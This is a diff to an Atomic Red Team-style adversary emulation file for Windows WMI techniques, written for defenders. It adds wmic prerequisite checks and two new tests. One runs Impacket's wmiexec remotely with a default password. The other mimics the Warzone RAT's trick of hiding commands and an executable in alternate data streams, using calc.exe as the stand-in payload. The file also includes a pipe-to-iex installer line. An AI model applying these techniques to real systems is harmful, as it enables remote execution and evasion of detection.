@@ -8,6 +8,14 @@ atomic_tests:
     When the test completes , there should be local user accounts information displayed on the command line.
   supported_platforms:
   - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
   executor:
     command: |
       wmic useraccount get /ALL /format:csv
@@ -19,6 +27,14 @@ atomic_tests:
     When the test completes , there should be running processes listed on the command line.
   supported_platforms:
   - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
   executor:
     command: |
       wmic process get caption,executablepath,commandline /format:csv
@@ -30,6 +46,14 @@ atomic_tests:
     When the test completes, there should be a list of installed patches and when they were installed.
   supported_platforms:
   - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      wmic.exe must be present on the system. It is disabled by default on Windows 11, version 24H2 and later, and removed when upgrading to version 25H2.
+    prereq_command: |
+      if (Test-Path "$env:SystemRoot\System32\wbem\wmic.exe") {exit 0} else {exit 1}
+    get_prereq_command: |
+      DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
   executor:
     command: |
       wmic qfe get description,installedOn /format:csv
@@ -210,3 +234,133 @@ atomic_tests:
     cleanup_command: msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
     name: command_prompt
     elevation_required: true
+- name: Impacket wmiexec.py
+  auto_generated_guid: a3ddaf15-d1a1-4bc3-8683-84c7c67120fe
+  description: |
+    wmiexec.py is tool included in the Impacket toolkit that allows to execute commands remotely on a Windows System using WMI (Windows management Instrumentation).
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_domain:
+      description: Domain of the Target machine.
+      type: string
+      default: "$env:USERDNSDOMAIN"
+    user_name:
+      description: username on the target machine.
+      type: string
+      default: "$env:USERNAME"
+    password:
+      description: password for the target machine
+      type: string
+      default: "1234"
+    target_host:
+      description: IP address or hostname of the target machine.
+      type: string
+      default: "$env:COMPUTERNAME"
+    command:
+      description: Command to execute on the target machine.
+      type: string
+      default: "ipconfig"
+    optional_args:
+      description: Additional arguments to use (like -k -no-pass)
+      type: string
+      default:
+    uv_install_dir:
+      description: Directory where the uv binary is installed
+      type: path
+      default: $env:TEMP\uv
+    uv_tool_dir:
+      description: Directory where uv installs tool virtualenvs
+      type: path
+      default: $env:TEMP\uv\tools
+    uv_tool_bin_dir:
+      description: Directory where uv places tool executable shims
+      type: path
+      default: $env:TEMP\uv\tools\bin
+  dependencies:
+  - description: |
+      uv must be installed
+    prereq_command: |
+      if (Test-Path "#{uv_install_dir}\uv.exe") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $env:UV_INSTALL_DIR = "#{uv_install_dir}"
+      irm https://astral.sh/uv/install.ps1 | iex
+      New-Item -ItemType File -Path "$env:TEMP\uv_installed_by_atomic" -Force | Out-Null
+  - description: |
+      Impacket must be installed via uv
+    prereq_command: |
+      if (Test-Path "#{uv_tool_bin_dir}\wmiexec.py") { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+      $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+      $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+      uv tool install impacket
+  executor:
+    command: |
+      cd #{uv_tool_bin_dir}
+      $optionalArgs = "#{optional_args}"
+      $argList = @("#{command}")
+      if (-not [string]::IsNullOrWhiteSpace($optionalArgs)) { $argList += $optionalArgs.Split(" ") }
+      .\wmiexec.py #{target_domain}/#{user_name}:#{password}@#{target_host} @argList
+    cleanup_command: |
+      $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+      $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+      $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+      uv tool uninstall impacket 2>$null
+      Remove-Item "#{uv_tool_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+      if (Test-Path "$env:TEMP\uv_installed_by_atomic") {
+        Remove-Item "$env:TEMP\uv_installed_by_atomic" -Force -ErrorAction SilentlyContinue
+        uv self uninstall 2>$null
+      }
+    name: powershell
+- name: AveMaria/Warzone program.bat WMIC Process Creation
+  auto_generated_guid: 778b54b0-ae7a-4f80-b74b-59eddee87ad5
+  description: |
+    Emulates the evasive behavior of the Ave Maria/Warzone RAT, which follows these steps:
+    1. Creates a batch script (program_path) that runs commands found in its own ADS named start (program_path:start)
+    2. Writes to program_path:start a wmiexec command that starts a process from an ADS named ApplicationData of a specified file (ads_host:ApplicationData)
+    3. Writes to the ADS ads_host:ApplicationData the contents of an executable (normally would be the ransomware)
+    4. Runs the batch script, which runs everything that was set up
+
+    Reference: https://www.splunk.com/en_us/blog/security/defending-the-gates-understanding-and-detecting-ave-maria-warzone-rat.html
+  supported_platforms:
+  - windows
+  input_arguments:
+    payload_binary:
+      description: Benign executable to persist (stand-in for the malware payload)
+      type: path
+      default: C:\Windows\System32\calc.exe
+    program_path:
+      description: Full filepath (including filename) that the batch script is created to
+      type: path
+      default: $env:TEMP\program.bat
+    ads_host:
+      description: File the Alternate Data Stream ApplicationData is attached to
+      type: path
+      default: $env:TEMP\ads
+  dependencies:
+    - description: |
+        ads_host must exist
+      prereq_command: |
+        if (Test-Path -Path "#{ads_host}") { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        $parent = Split-Path "#{ads_host}"
+        New-Item -ItemType Directory -Path "$parent" -Force
+        New-Item -ItemType File -Path "#{ads_host}" -Force
+        New-Item -ItemType File -Path "$env:TEMP\ads_created" -Force
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $parent = Split-Path "#{program_path}"
+      New-Item -ItemType Directory -Path "$parent" -Force
+      New-Item -ItemType File -Path "#{program_path}" -Force
+      Set-Content -Path "#{program_path}" -Value "for /F `"usebackq tokens=*`" %%A in (`"#{program_path}:start`") do %%A"
+      Set-Content -Path "#{program_path}" -Stream start -Value "wmic process call create `"#{ads_host}:ApplicationData`""
+      Get-Content "#{payload_binary}" -Encoding Byte -Raw | Set-Content -Path "#{ads_host}" -Stream ApplicationData -Encoding Byte
+      Start-Process "#{program_path}"
+    cleanup_command: |
+      Get-Process | Where-Object { $_.Path -eq "#{payload_binary}" } | Stop-Process -Force -ErrorAction SilentlyContinue
+      Remove-Item "#{program_path}" -Force -ErrorAction Ignore
+      if (Test-Path -Path "$env:TEMP\ads_created"){Remove-Item -Path "#{ads_host}" -ErrorAction Ignore} else {Remove-Item -Path "#{ads_host}" -Stream "ApplicationData" -ErrorAction Ignore}
+      Remove-Item -Path "$env:TEMP\ads_created" -Force -ErrorAction Ignore
